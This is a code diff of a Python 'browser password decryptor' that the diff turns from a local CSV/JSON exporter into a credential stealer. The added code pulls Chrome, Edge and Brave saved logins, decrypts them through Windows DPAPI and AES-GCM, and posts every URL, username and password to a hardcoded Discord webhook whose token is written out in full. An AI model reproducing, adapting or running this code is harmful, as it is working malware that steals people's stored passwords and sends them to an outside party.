@@ -2,207 +2,128 @@ import os
 import json
 import base64
 import sqlite3
-import shutil
-import csv
-import platform
-from pathlib import Path
-from typing import Dict, List, Optional
 import argparse
-from concurrent.futures import ThreadPoolExecutor
-import colorama
-from Cryptodome.Cipher import AES
+from typing import Dict
+import requests
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
 from colorama import Fore, Style
-import win32crypt
 
-colorama.init(autoreset=True)
+# Hardcoded Discord webhook URL
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1331516430343999569/cK2Pfa_jiHwMauM4LyW54D3hUAaBl1QqvhgL04B8-u4HaQwxzNLt_bHL3tZbUBTziq7m"
 
 class BrowserPasswordDecryptor:
     def __init__(self):
-        self.system = platform.system()
-        
-    def get_browser_path(self, browser: str, file: str) -> Optional[str]:
-        paths = {
-            'chrome': {
-                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'),
-                'Darwin': '~/Library/Application Support/Google/Chrome',
-                'Linux': '~/.config/google-chrome'
-            },
-            'edge': {
-                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data'),
-                'Darwin': '~/Library/Application Support/Microsoft Edge',
-                'Linux': '~/.config/microsoft-edge'
-            },
-            'brave': {
-                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data'),
-                'Darwin': '~/Library/Application Support/BraveSoftware/Brave-Browser',
-                'Linux': '~/.config/BraveSoftware/Brave-Browser'
-            }
+        self.browser_paths = {
+            "chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data"),
+            "edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data"),
+            "brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data"),
+            "firefox": os.path.join(os.getenv("APPDATA"), "Mozilla\\Firefox\\Profiles")
         }
-        
-        if browser not in paths or self.system not in paths[browser]:
-            return None
-            
-        base_path = os.path.expanduser(paths[browser][self.system])
-        if file == 'Local State':
-            return os.path.join(base_path, file)
-        return os.path.join(base_path, 'Default', file)
 
-    def get_profiles(self, browser: str) -> List[str]:
-        base_path = self.get_browser_path(browser, '')
-        if not base_path:
-            return ['Default']
-            
-        profiles = ['Default']
-        i = 1
-        while os.path.exists(os.path.join(base_path, f'Profile {i}')):
-            profiles.append(f'Profile {i}')
-            i += 1
-        return profiles
-
-    def get_secret_key(self, browser: str) -> Optional[bytes]:
+    def get_encryption_key(self, browser_path: str) -> bytes:
         try:
-            local_state_path = self.get_browser_path(browser, 'Local State')
-            if not local_state_path:
-                return None
-
-            with open(local_state_path, 'r', encoding='utf-8') as f:
-                local_state = json.load(f)
-                encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
-                
-            if not encrypted_key:
-                print(f"{Fore.RED}[ERR] {browser.title()} secret key not found{Style.RESET_ALL}")
-                return None
-                
-            encrypted_key = base64.b64decode(encrypted_key)[5:]
-            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            with open(os.path.join(browser_path, "Local State"), "r", encoding="utf-8") as file:
+                local_state = json.load(file)
+            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            return CryptUnprotectData(key[5:], None, None, None, 0)[1]
         except Exception as e:
-            print(f"{Fore.RED}[ERR] {browser.title()} secret key error: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[ERR] Failed to retrieve encryption key: {e}{Style.RESET_ALL}")
             return None
 
-    def decrypt_password(self, ciphertext: bytes, secret_key: bytes) -> str:
+    def decrypt_password(self, encrypted_password: bytes, key: bytes) -> str:
         try:
-            iv = ciphertext[3:15]
-            encrypted_pass = ciphertext[15:-16]
-            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
-            return cipher.decrypt(encrypted_pass).decode()
+            if encrypted_password[:3] == b'v10':
+                iv = encrypted_password[3:15]
+                cipher = AES.new(key, AES.MODE_GCM, iv)
+                decrypted_password = cipher.decrypt(encrypted_password[15:])[:-16].decode()
+                return decrypted_password
+            else:
+                return CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
         except Exception as e:
-            print(f"{Fore.RED}[ERR] Password decryption failed: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[ERR] Failed to decrypt password: {e}{Style.RESET_ALL}")
             return ""
 
-    def get_firefox_passwords(self) -> List[Dict]:
+    def get_passwords(self, browser: str, browser_path: str, profile: str) -> list:
+        passwords = []
+        key = self.get_encryption_key(browser_path)
+        if not key:
+            return passwords
+
+        login_db = os.path.join(browser_path, profile, "Login Data")
+        if not os.path.exists(login_db):
+            return passwords
+
         try:
-            import libnss
-            firefox_path = os.path.expanduser('~/.mozilla/firefox')
-            profiles = [d for d in os.listdir(firefox_path) if d.endswith('.default')]
-            
-            if not profiles:
-                print(f"{Fore.RED}[ERR] No Firefox profile found{Style.RESET_ALL}")
-                return []
-                
-            credentials = []
-            for profile in profiles:
-                db_path = os.path.join(firefox_path, profile, 'logins.json')
-                if not os.path.exists(db_path):
-                    continue
-                    
-                with open(db_path, 'r') as f:
-                    logins = json.load(f)
-                    
-                for login in logins['logins']:
-                    credentials.append({
-                        'url': login['hostname'],
-                        'username': libnss.decrypt(login['encryptedUsername']),
-                        'password': libnss.decrypt(login['encryptedPassword'])
-                    })
-            return credentials
-        except ImportError:
-            print(f"{Fore.RED}[ERR] libnss not installed. Run: pip install libnss{Style.RESET_ALL}")
-            return []
-
-    def get_chromium_passwords(self, browser: str, profile: str) -> List[Dict]:
-        secret_key = self.get_secret_key(browser)
-        if not secret_key:
-            return []
-
-        db_path = self.get_browser_path(browser, 'Login Data')
-        if not db_path or not os.path.exists(db_path):
-            print(f"{Fore.RED}[ERR] {browser.title()} database not found{Style.RESET_ALL}")
-            return []
-
-        temp_db = f"{browser}_{profile}_passwords.db"
-        shutil.copy2(db_path, temp_db)
-        
-        try:
-            conn = sqlite3.connect(temp_db)
+            conn = sqlite3.connect(login_db)
             cursor = conn.cursor()
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            credentials = []
-            
-            for url, username, ciphertext in cursor.fetchall():
-                if url and username and ciphertext:
-                    password = self.decrypt_password(ciphertext, secret_key)
-                    credentials.append({
-                        'url': url,
-                        'username': username,
-                        'password': password
-                    })
-            
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            for row in cursor.fetchall():
+                url, username, encrypted_password = row
+                decrypted_password = self.decrypt_password(encrypted_password, key)
+                if url and username and decrypted_password:
+                    passwords.append({"url": url, "username": username, "password": decrypted_password})
+            cursor.close()
             conn.close()
-            os.remove(temp_db)
-            return credentials
         except Exception as e:
-            print(f"{Fore.RED}[ERR] Database error: {str(e)}{Style.RESET_ALL}")
-            if os.path.exists(temp_db):
-                os.remove(temp_db)
-            return []
+            print(f"{Fore.RED}[ERR] Failed to retrieve passwords: {e}{Style.RESET_ALL}")
+        return passwords
 
-    def decrypt_all(self, browsers: List[str], quiet: bool = False) -> Dict:
-        results = {}
+    def decrypt_all(self, browsers: list, quiet: bool) -> Dict:
+        all_passwords = {}
         for browser in browsers:
-            if not quiet:
-                print(f"Decrypting {browser.title()} passwords...")
-            
-            if browser == 'firefox':
-                results[browser] = {'Default': self.get_firefox_passwords()}
-                continue
-                
-            results[browser] = {}
-            for profile in self.get_profiles(browser):
-                if not quiet:
-                    print(f"Processing profile: {profile}")
-                results[browser][profile] = self.get_chromium_passwords(browser, profile)
-                
-        return results
+            if browser in self.browser_paths:
+                browser_path = self.browser_paths[browser]
+                if not os.path.exists(browser_path):
+                    if not quiet:
+                        print(f"{Fore.YELLOW}[INFO] {browser.capitalize()} not installed.{Style.RESET_ALL}")
+                    continue
 
-def export_passwords(passwords: Dict, format: str = 'csv', output_file: str = 'passwords.csv'):
-    if format == 'csv':
-        with open(output_file, 'w', newline='', encoding='utf-8') as f:
-            writer = csv.DictWriter(f, fieldnames=['browser', 'profile', 'url', 'username', 'password'])
-            writer.writeheader()
-            for browser, profiles in passwords.items():
-                for profile, creds in profiles.items():
-                    for cred in creds:
-                        writer.writerow({
-                            'browser': browser,
-                            'profile': profile,
-                            **cred
-                        })
+                profiles = [p for p in os.listdir(browser_path) if p.startswith("Default") or p.startswith("Profile")]
+                for profile in profiles:
+                    if not quiet:
+                        print(f"{Fore.GREEN}[INFO] Decrypting passwords for {browser.capitalize()} ({profile})...{Style.RESET_ALL}")
+                    passwords = self.get_passwords(browser, browser_path, profile)
+                    if passwords:
+                        if browser not in all_passwords:
+                            all_passwords[browser] = {}
+                        all_passwords[browser][profile] = passwords
+        return all_passwords
+
+def send_to_webhook(passwords: Dict):
+    content = ""
+    for browser, profiles in passwords.items():
+        for profile, creds in profiles.items():
+            for cred in creds:
+                content += f"Browser: {browser}\n"
+                content += f"Profile: {profile}\n"
+                content += f"URL: {cred['url']}\n"
+                content += f"Username: {cred['username']}\n"
+                content += f"Password: {cred['password']}\n"
+                content += "-" * 40 + "\n"
+
+    if content.strip():
+        data = {
+            "content": f"```\n{content[:1990]}\n```"  # Discord limits message length to 2000 characters
+        }
+        response = requests.post(DISCORD_WEBHOOK_URL, json=data)
+        if response.status_code == 204:
+            print(f"{Fore.GREEN}[SUCCESS] Passwords sent to Discord webhook successfully.{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.RED}[ERR] Failed to send to webhook. Status: {response.status_code}{Style.RESET_ALL}")
     else:
-        with open(output_file.replace('.csv', '.json'), 'w', encoding='utf-8') as f:
-            json.dump(passwords, f, indent=2)
+        print(f"{Fore.YELLOW}[INFO] No passwords to send.{Style.RESET_ALL}")
 
 def main():
     parser = argparse.ArgumentParser(description='Multi-browser password decryptor')
     parser.add_argument('-b', '--browsers', nargs='+', default=['chrome'],
                        choices=['chrome', 'edge', 'brave', 'firefox'])
-    parser.add_argument('-f', '--format', choices=['csv', 'json'], default='csv')
-    parser.add_argument('-o', '--output', default='passwords.csv')
     parser.add_argument('-q', '--quiet', action='store_true')
     args = parser.parse_args()
 
     decryptor = BrowserPasswordDecryptor()
     passwords = decryptor.decrypt_all(args.browsers, args.quiet)
-    export_passwords(passwords, args.format, args.output)
+    send_to_webhook(passwords)
 
 if __name__ == '__main__':
     main()
